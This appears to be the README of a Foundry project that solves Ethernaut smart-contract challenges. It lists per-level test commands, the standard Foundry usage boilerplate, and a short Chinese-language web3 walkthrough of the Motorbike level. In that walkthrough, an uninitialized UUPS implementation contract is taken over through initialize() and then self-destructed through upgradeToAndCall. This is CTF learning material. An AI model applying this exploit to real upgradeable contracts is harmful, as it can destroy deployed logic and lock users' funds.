```shell
forge test --match-path ./test/Fallback.t.sol
forge test --match-path ./test/Fallout.t.sol
forge test --match-path ./test/CoinFlip.t.sol
forge test --match-path ./test/Telephone.t.sol
forge test --match-path ./test/Token.t.sol
forge test --match-path ./test/Delegation.t.sol
forge test --match-path ./test/Force.t.sol
forge test --match-path ./test/Vault.t.sol
forge test --match-path ./test/King.t.sol
forge test --match-path ./test/Reentrancy.t.sol
forge test --match-path ./test/Elevator.t.sol
forge test --match-path ./test/Privacy.t.sol
forge test --match-path ./test/GatekeeperOne.t.sol
forge test --match-path ./test/GatekeeperTwo.t.sol
forge test --match-path ./test/NaughtCoin.t.sol
forge test --match-path ./test/Preservation.t.sol
forge test --match-path ./test/Recovery.t.sol
forge test --match-path ./test/MagicNumber.t.sol
forge test --match-path ./test/AlienCodex.t.sol
forge test --match-path ./test/Denial.t.sol
forge test --match-path ./test/Shop.t.sol
forge test --match-path ./test/Dex.t.sol
forge test --match-path ./test/DexTwo.t.sol
forge test --match-path ./test/PuzzleWallet.t.sol
forge test --match-path ./test/Motorbike.t.sol
forge test --match-path ./test/DoubleEntryPoint.t.sol
forge test --match-path ./test/GoodSamaritan.t.sol



forge script script/MotorbikeDeploy.s.sol --rpc-url $RPC_URL_LOCAL --broadcast
forge script script/MotorbikeInteract.s.sol --rpc-url $RPC_URL_LOCAL --broadcast

forge install OpenZeppelin/openzeppelin-contracts@v3.4.2 --no-commit (solidity 0.6)
forge install OpenZeppelin/openzeppelin-contracts@v4.8.2 --no-commit (solidity 0.6)
```

Motorbike web 实现(sepolia 网络)

```
获取当前逻辑合约的地址
await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")

0x000000000000000000000000e414f6cb24cf364877fa306b3e488f3204650721
返回的值将为 32 个字节，其中最右边的 20 个字节将是地址。梳理一下，并在其左侧附加 0x。
我们得到 0xe414f6cb24cf364877fa306b3e488f3204650721

let initializeCall = web3.eth.abi.encodeFunctionSignature("initialize()")
let implAddr = "0xe414f6cb24cf364877fa306b3e488f3204650721"
await web3.eth.sendTransaction({from: player, to: implAddr, data: initializeCall})

remix 部署 Destructive
0x788d8efa489aD7f32cA96e2B8e4d4d2aBac0B168

let kill = web3.eth.abi.encodeFunctionSignature("killed()")
let callStr = web3.eth.abi.encodeFunctionCall({ name: 'upgradeToAndCall', type: 'function', inputs: [{ type: 'address', name: 'newImplementation' },{ type: 'bytes', name: 'data' }]}, ["0x788d8efa489aD7f32cA96e2B8e4d4d2aBac0B168",kill]);

await web3.eth.sendTransaction({from: player, to: implAddr, data: callStr})
```

## Foundry

**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**

Foundry consists of:

-   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
-   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
-   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
-   **Chisel**: Fast, utilitarian, and verbose solidity REPL.

## Documentation

https://book.getfoundry.sh/

## Usage

### Build

```shell
$ forge build
```

### Test

```shell
$ forge test
```

### Format

```shell
$ forge fmt
```

### Gas Snapshots

```shell
$ forge snapshot
```

### Anvil

```shell
$ anvil
```

### Deploy

```shell
$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
```

### Cast

```shell
$ cast <subcommand>
```

### Help

```shell
$ forge --help
$ anvil --help
$ cast --help
```
